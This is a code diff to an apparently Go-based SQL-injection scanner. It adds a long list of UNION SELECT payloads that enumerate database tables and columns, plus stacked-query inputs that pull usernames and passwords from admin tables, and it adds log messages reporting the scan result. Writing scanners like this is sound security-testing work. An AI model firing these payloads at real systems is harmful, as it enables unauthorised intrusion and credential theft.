@@ -93,6 +93,27 @@ func scan(url string) bool {
 		"SELECT * FROM users WHERE username = 'admin' AND password = 'password' UNION ALL SELECT column_name, column_name, column_name FROM information_schema.columns--'",
 		"SELECT * FROM users WHERE username = 'admin' AND password = 'password' UNION ALL SELECT table_name, column_name, column_name FROM information_schema.columns--'",
 		"SELECT * FROM users WHERE username = 'admin' AND password = 'password' UNION ALL SELECT column_name, table_name, table_name FROM information_schema.columns--'",
+		"SELECT * FROM admins WHERE username = 'admin' AND password = 'password' UNION SELECT NULL, NULL, NULL--'",
+		"SELECT * FROM admins WHERE username = 'admin' AND password = 'password' UNION SELECT 'a', 'b', 'c'--'",
+		"SELECT * FROM admins WHERE username = 'admin' AND password = 'password' UNION ALL SELECT 'a', 'b', 'c'--'",
+		"SELECT * FROM admins WHERE username = 'admin' AND password = 'password' UNION ALL SELECT NULL, table_name, NULL FROM information_schema.tables--'",
+		"SELECT * FROM admins WHERE username = 'admin' AND password = 'password' UNION ALL SELECT NULL, column_name, NULL FROM information_schema.columns--'",
+		"SELECT * FROM admins WHERE username = 'admin' AND password = 'password' UNION ALL SELECT table_name, column_name, NULL FROM information_schema.columns--'",
+		"SELECT * FROM admins WHERE username = 'admin' AND password = 'password' UNION ALL SELECT table_name, NULL, NULL FROM information_schema.tables--'",
+		"SELECT * FROM admins WHERE username = 'admin' AND password = 'password' UNION ALL SELECT column_name, NULL, NULL FROM information_schema.columns--'",
+		"SELECT * FROM admins WHERE username = 'admin' AND password = 'password' UNION ALL SELECT table_name, column_name, column_name FROM information_schema.columns--'",
+		"SELECT * FROM admins WHERE username = 'admin' AND password = 'password' UNION ALL SELECT table_name, column_name, table_name FROM information_schema.columns--'",
+		"SELECT * FROM admins WHERE username = 'admin' AND password = 'password' UNION ALL SELECT table_name, table_name, column_name FROM information_schema.columns--'",
+		"SELECT * FROM admins WHERE username = 'admin' AND password = 'password' UNION ALL SELECT column_name, column_name, table_name FROM information_schema.columns--'",
+		"SELECT * FROM admins WHERE username = 'admin' AND password = 'password' UNION ALL SELECT column_name, table_name, table_name FROM information_schema.columns--'",
+		"SELECT * FROM admins WHERE username = 'admin' AND password = 'password' UNION ALL SELECT table_name, table_name, table_name FROM information_schema.columns--'",
+		"SELECT * FROM admins WHERE username = 'admin' AND password = 'password' UNION ALL SELECT table_name, table_name, column_name FROM information_schema.columns--'",
+		"SELECT * FROM admins WHERE username = 'admin' AND password = 'password' UNION ALL SELECT column_name, table_name, column_name FROM information_schema.columns--'",
+		"SELECT * FROM admins WHERE username = 'admin' AND password = 'password' UNION ALL SELECT column_name, column_name, column_name FROM information_schema.columns--'",
+		"SELECT * FROM admins WHERE username = 'admin' AND password = 'password' UNION ALL SELECT table_name, column_name, column_name FROM information_schema.columns--'",
+		"SELECT * FROM admins WHERE username = 'admin' AND password = 'password' UNION ALL SELECT column_name, table_name, table_name FROM information_schema.columns--'",
+		"58 OR 1=1;select username, password from admins where 1=1",
+		"58 OR 1=1;select username, password from root where 1=1",
 	}
 
 	insertPayloads := []string{
@@ -168,8 +189,12 @@ func main() {
 	flag.Parse()
 
 	if scan(*hostFlag) {
+		log.Println("not safe against sql-injection attacks!")
+
 		os.Exit(1)
 	}
+
+	log.Println("safe against sql-injection attacks")
 
 	os.Exit(0)
 }
